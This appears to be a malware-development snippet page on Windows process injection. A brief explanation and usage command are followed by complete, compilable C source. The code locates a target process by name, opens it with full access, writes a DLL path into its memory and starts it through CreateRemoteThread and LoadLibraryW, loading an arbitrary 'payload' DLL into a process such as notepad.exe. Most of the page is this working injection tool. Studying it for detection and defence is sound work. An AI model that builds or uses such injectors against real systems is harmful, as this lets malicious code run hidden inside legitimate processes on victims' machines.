# Process Injection - DLL Injection

#### DLL Injection Technique

This C code demonstrates how to inject a DLL into a remote process:

1. **GetRemoteProcessHandle Function**:
   * Captures a snapshot of all active processes.
   * Compares each process name to the specified target name.
   * Returns the process handle if a match is found.
2. **InjectDllToRemoteProcess Function**:
   * Uses the acquired process handle.
   * Allocates memory in the target process with `VirtualAllocEx`.
   * Writes the DLL name into the allocated memory space.
   * Starts a remote thread in the process to load the DLL.

This approach dynamically incorporates additional functionality into the target application by injecting the specified DLL.

Usage:&#x20;

{% code overflow="wrap" %}
```powershell
.\ProcessInjection_DLL.exe "D:\MalDev Snippets\simpleDLL\x64\Debug\simpleDLL.dll" notepad.exe
```
{% endcode %}

```c
#include <stdio.h>
#include <Windows.h>
#include <tlhelp32.h>

BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {

	PROCESSENTRY32	Proc = {
		.dwSize = sizeof(PROCESSENTRY32)
	};
	HANDLE hSnapShot = NULL;
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("[!] CreateToolhelp32Snapshot failed with error: %d\n", GetLastError());
		goto _EndOfFunction;
	}

	if (!Process32First(hSnapShot, &Proc)) {
		printf("[!] Process32First failed with error: %d\n", GetLastError());
		goto _EndOfFunction;
	}

	do {

		WCHAR LowerName[MAX_PATH * 2];

		if (Proc.szExeFile) {
			DWORD dwSize = lstrlenW(Proc.szExeFile);
			DWORD i = 0;
			RtlSecureZeroMemory(LowerName, MAX_PATH * 2);


			if (dwSize < MAX_PATH * 2) {

				for (; i < dwSize; i++)
					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);
				LowerName[i++] = '\0';
			}
		}

		if (wcscmp(LowerName, szProcessName) == 0) {
			*dwProcessId = Proc.th32ProcessID;
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProcess == NULL) {
				printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());
				goto _EndOfFunction;
			}
		}
	} while (Process32Next(hSnapShot, &Proc));

	_EndOfFunction:
		if (hSnapShot != NULL)
			CloseHandle(hSnapShot);
		if (*dwProcessId == NULL || *hProcess == NULL)
			return FALSE;
		return TRUE;
}


BOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR DllName) {

	BOOL BSTATE = TRUE;
	LPVOID pLoadLibraryW = NULL;
	LPVOID pAddress = NULL;
	DWORD dwSizeToWrite = lstrlen(DllName) * sizeof(WCHAR);
	SIZE_T lpNumberOfBytesWritten = NULL;
	HANDLE hThread = NULL;


	pLoadLibraryW = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryW");
	if (pLoadLibraryW == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		BSTATE = FALSE; goto _EndOfFunction;
	}

	pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		BSTATE = FALSE; goto _EndOfFunction;
	}

	printf("[i] pAddress Allocated at:  0x%p of Size: %d\n", pAddress, dwSizeToWrite);
	printf("[#] Press <Enter> to write...");
	getchar();

	if(!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite){
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		BSTATE = FALSE; goto _EndOfFunction;
	}

	printf("[i] Sucessfully Written %d Bytes\n", lpNumberOfBytesWritten);
	printf("[#] Press <Enter> to Run...");
	getchar();

	printf("[i] Executing Payload...");
	hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibraryW, pAddress, NULL, NULL);
	if (hThread == NULL) {
		printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
		BSTATE = FALSE; goto _EndOfFunction;
	}
	printf("[+] Done !\n");


_EndOfFunction:
	if (hThread)
		CloseHandle(hThread);
	return BSTATE;
}

int wmain(int argc, wchar_t* argv[]) {

	HANDLE	hProcess = NULL;
	DWORD	dwProcessId = NULL;

	if (argc < 3) {
		wprintf(L"[!] Usage : \"%s\" <Complete Dll Payload Path> <Process Name> \n", argv[0]);
		return -1;
	}

	wprintf(L"[i] Searching For Process Id Of \"%s\" ... ", argv[2]);
	if (!GetRemoteProcessHandle(argv[2], &dwProcessId, &hProcess)) {
		printf("[!] Process is Not Found \n");
		return -1;
	}
	wprintf(L"[+] DONE \n");



	printf("[i] Found Target Process Pid: %d \n", dwProcessId);
	if (!InjectDllToRemoteProcess(hProcess, argv[1])) {
		return -1;
	}


	CloseHandle(hProcess);
	printf("[#] Press <Enter> To Quit ... ");
	getchar();
	return 0;
}
```
